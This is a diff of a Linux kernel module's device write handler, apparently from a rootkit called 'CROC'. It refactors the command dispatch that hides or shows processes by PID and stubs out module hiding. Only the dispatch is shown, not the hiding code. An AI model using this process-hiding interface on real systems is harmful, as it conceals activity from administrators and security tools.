@@ -157,22 +157,24 @@ ssize_t dev_write(struct file* p_file, const char __user* p_buf, size_t count, l
         return rc;
     }
 
-    if (cmd & CROC_IOC_PID) {
-        if (cmd & CROC_IOC_HIDE_CMD) {
-            rc = ioc_hide_proc(p_dev, arg);
-            KLOG_DEBUG(LOG_PREFIX "device::dev_read: pid %ld has been hidden with result %d", arg, rc);
-        } else if (cmd & CROC_IOC_SHOW_CMD) {
-            rc = ioc_show_proc(p_dev, arg);
-            KLOG_DEBUG(LOG_PREFIX "device::dev_read: pid %ld has been showed with result %d", arg, rc);
-        } else {
-            return -EFAULT;
-        }
-    } else if (cmd & CROC_IOC_MOD) {
+    switch (cmd) {
+    case CROC_IOC_HIDE_PID_CMD:
+        rc = ioc_hide_proc(p_dev, arg);
+        KLOG_DEBUG(LOG_PREFIX "device::dev_read: pid %ld has been hidden with result %d", arg, rc);
+        break;
+    case CROC_IOC_SHOW_PID_CMD:
+        rc = ioc_show_proc(p_dev, arg);
+        KLOG_DEBUG(LOG_PREFIX "device::dev_read: pid %ld has been showed with result %d", arg, rc);
+        break;
+    case CROC_IOC_HIDE_MOD_CMD:
+    case CROC_IOC_SHOW_MOD_CMD:
         /* @todo    Implement */
-    } else if (cmd & CROC_IOC_LOG) {
+        break;
+    case CROC_IOC_LOG:
         SET_LOGF_LEVEL(arg);
         KLOG_DEBUG(LOG_PREFIX "device::dev_read: setted log level %ld", arg);
-    } else {
+        break;
+    default:
         return -EFAULT;
     }
 
